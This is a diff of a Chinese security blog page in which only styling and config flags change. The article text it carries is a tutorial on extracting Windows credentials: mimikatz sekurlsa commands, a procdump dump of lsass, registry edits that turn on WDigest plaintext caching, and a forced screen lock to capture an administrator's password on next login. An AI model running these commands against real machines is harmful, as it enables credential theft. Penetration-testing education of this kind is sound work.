@@ -56,7 +56,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"fireline.fun","root":"/","version":"1.8.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"https://hm.baidu.com/hm.js?613daf119ed9302ff8cc0e60daf78bfe","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"fireline.fun","root":"/","version":"1.8.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"https://hm.baidu.com/hm.js?613daf119ed9302ff8cc0e60daf78bfe","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -276,7 +276,7 @@
 </blockquote>
 <h1 id="Windows系统散列值获取"><a href="#Windows系统散列值获取" class="headerlink" title="Windows系统散列值获取"></a>Windows系统散列值获取</h1><h2 id="0x01-LM-Hash与NTLM-Hash"><a href="#0x01-LM-Hash与NTLM-Hash" class="headerlink" title="0x01 LM Hash与NTLM Hash"></a>0x01 LM Hash与NTLM Hash</h2><p>Windows操作系统通常使用两种方法对用户的明文密码进行加密处理。在域环境中，用户信息存储在<code>ntds.dit</code>中，加密后为散列值。</p>
 <p>Windows操作系统中的密码一般由两部分组成，一部分为LM Hash，另一部分为NTLM Hash。在Windows操作系统中，Hash的结构通常如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">username:RID:LM-HASH:NT-HASH<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">username:RID:LM-HASH:NT-HASH<br></code></pre></div></td></tr></table></figure>
 
 <blockquote>
 <p>  LM Hash的全名为”LAN Manager Hash”，是微软为了提高Windows操作系统的安全性而采用的散列值加密算法，其本质是DES加密。尽管LM Hash比较容易破解，但是为了保证系统的兼容性，Windows只是将LM Hash禁用了（从 Windows Vista 和 Windows 2008 版本开始禁用）。如果LM Hash被禁用了，攻击者通过工具抓取的LM Hash值通常是”aad3b435b51404eeaad3b435b51404ee”(表示LM Hash值为空或者被禁用)。</p>
@@ -287,7 +287,7 @@
 <p>在<strong>KB2871997</strong>之前， 使用 Mimikatz 可以直接抓取明文密码。</p>
 <p>当服务器安装 <strong>KB2871997</strong> 补丁后，系统默认禁用 Wdigest Auth（<strong>Windows 2012及以上版本</strong>） ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。<br>    但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）之后通过手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录 = 截取明文密码</p>
 <h3 id="使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）"><a href="#使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）" class="headerlink" title="使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）"></a>使用mimikatz在线读取SAM文件（目标没有杀软，或者<code>mimikatz</code>已免杀）</h3><p>直接将<code>mimikatz</code>上传至目标机器</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;    #在线读取散列值及铭文密码<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;    #在线读取散列值及铭文密码<br></code></pre></div></td></tr></table></figure>
 
 <p>该操作需要管理员权限，否则报错，无法读取密码，报错信息如下</p>
 <p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210207221939.png" srcset="/img/loading.gif" lazyload alt="image-20210207221937863"></p>
@@ -297,44 +297,44 @@
 <p>通过 <code>procdump.exe</code> 文件导出<code>lsass.dmp</code>文件（Procdump是微软官方发布的工具，可以在命令行下将目标lsass文件导出，且杀毒软件不会拦截）</p>
 <p><code>procdump</code>下载地址：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p>
 <p><strong>管理员权限运行</strong>该命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">procdump.exe -accepteula -ma lsass.exe lsass.dmp<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">procdump.exe -accepteula -ma lsass.exe lsass.dmp<br></code></pre></div></td></tr></table></figure>
 
 <p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210207215155.png" srcset="/img/loading.gif" lazyload alt="image-20210207214123607"></p>
 <p>(2）使用mimikatz导出lsass.dmp文件中的密码散列值</p>
 <p>将目标机器上的 <code>lsass.tmp</code> 拉取到本地，与<code>mimikatz</code>同目录，使用<code>mimikatz</code>解密目标系统密码。（本地机器需与目标机器的版本位数一致）</p>
 <p>运行mimikatz.exe 解密该文件。注：32位就用32位的<code>mimikatz</code>破解，同理64位的也是。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">sekurlsa::minidump lsass.dmp<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">sekurlsa::minidump lsass.dmp<br></code></pre></div></td></tr></table></figure>
 
 <p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210207213854.png" srcset="/img/loading.gif" lazyload alt="image-20210207213852318"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">sekurlsa::logonpasswords full<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">sekurlsa::logonpasswords full<br></code></pre></div></td></tr></table></figure>
 
 <p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210207214737.png" srcset="/img/loading.gif" lazyload alt="image-20210207214733408"></p>
 <h4 id="mimikatz无法读取到密码时"><a href="#mimikatz无法读取到密码时" class="headerlink" title="mimikatz无法读取到密码时"></a>mimikatz无法读取到密码时</h4><p>在默认情况下，当系统为<strong>Windows 2012R2</strong>以上或者安装 <strong>KB2871997</strong> 补丁时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，此时可以通过以下方式开启，但需要用户重新登录后才能成功抓取。</p>
 <p><strong>开启Wdigest Auth</strong></p>
 <ul>
 <li><p>cmd</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<br></code></pre></td></tr></table></figure></li>
+  <figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<br></code></pre></div></td></tr></table></figure></li>
 <li><p>powershell</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1<br></code></pre></td></tr></table></figure></li>
+  <figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1<br></code></pre></div></td></tr></table></figure></li>
 <li><p>meterpreter</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1<br></code></pre></td></tr></table></figure></li>
+  <figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1<br></code></pre></div></td></tr></table></figure></li>
 </ul>
 <p><strong>关闭Wdigest Auth</strong></p>
 <p>关闭命令如下：</p>
 <ul>
 <li><p>cmd</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<br></code></pre></td></tr></table></figure></li>
+  <figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<br></code></pre></div></td></tr></table></figure></li>
 <li><p>powershell</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0<br></code></pre></td></tr></table></figure></li>
+  <figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0<br></code></pre></div></td></tr></table></figure></li>
 <li><p>meterpreter</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0<br></code></pre></td></tr></table></figure></li>
+  <figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0<br></code></pre></div></td></tr></table></figure></li>
 </ul>
 <p><strong>强制锁屏</strong></p>
 <p>在开启 <code>Wdigest Auth</code> 后，需要管理员重新登录才能抓明文密码。</p>
 <p>强制锁屏，让管理员重新登录。</p>
 <ul>
 <li><p>cmd</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">rundll32 user32.dll,LockWorkStation<br></code></pre></td></tr></table></figure>
+  <figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">rundll32 user32.dll,LockWorkStation<br></code></pre></div></td></tr></table></figure>
 
 <p>  等待管理员重新登录，之后重新读取，可读到明文密码。</p>
 </li>
@@ -533,7 +533,7 @@
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
 
   <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
     NProgress.start()
     window.addEventListener('load', function() {
       NProgress.done();
